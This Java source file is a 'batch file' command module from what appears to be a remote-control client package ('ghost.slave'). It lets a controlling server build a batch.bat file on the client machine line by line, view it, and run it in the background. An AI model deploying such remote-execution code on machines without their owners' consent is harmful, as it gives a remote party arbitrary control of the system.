package top.idoknow.ghost.slave.func;

import top.idoknow.ghost.slave.cmd.AbstractFunc;
import top.idoknow.ghost.slave.cmd.AbstractProcessor;
import top.idoknow.ghost.slave.cmd.CommandProcessException;
import top.idoknow.ghost.slave.conn.HandleConn;
import top.idoknow.ghost.slave.core.ClientMain;
import top.idoknow.ghost.util.FileRW;

import java.io.File;

public class FuncBatch implements AbstractFunc {
	@Override
	public String getFuncName() {
		return "!!bat";
	}

	@Override
	public String[] getParamsModel() {
		return new String[]{"<oper>","[params]"};
	}

	@Override
	public String getDescription() {
		return "批处理文件";
	}

	@Override
	public int getMinParamsAmount() {
		return 1;
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {
		if(!new File("batch.bat").exists()){
			FileRW.write("batch.bat","");
		}
		switch (params[0]){
			case "reset":{
				FileRW.write("batch.bat","");
				HandleConn.writeToServerIgnoreException("已清空bat文件\n");
				break;
			}
			case "add":{
				if(params.length<2){
					HandleConn.writeToServerIgnoreException("命令语法不正确\n");
					break;
				}
				StringBuffer newLine=new StringBuffer();
				for(int i=1;i<params.length;i++){
					newLine.append(params[i]+" ");
				}
				FileRW.write("batch.bat",newLine.toString()+"\n",true);
				HandleConn.writeToServerIgnoreException("已添加"+newLine+"\n");
				break;
			}
			case "view":{

				String fileStr=FileRW.readWithLn("batch.bat");
				HandleConn.writeToServerIgnoreException("客户端的batch文件内容:\n"+fileStr+"共"+fileStr.length()+"个字符\n");
				break;
			}
			case "run":{
				HandleConn.writeToServerIgnoreException("正在启动batch.bat.\n");
				try {
					processor.start("!!proc bg batch batch.bat");
				} catch (CommandProcessException e) {
					e.printStackTrace();
					HandleConn.writeToServerIgnoreException("启动出错"+ ClientMain.getErrorInfo(e)+"\n");
				}
				break;
			}
			default:{
				HandleConn.writeToServerIgnoreException("命令语法不正确\n");
			}
		}
		HandleConn.sendFinishToServer();
	}
}
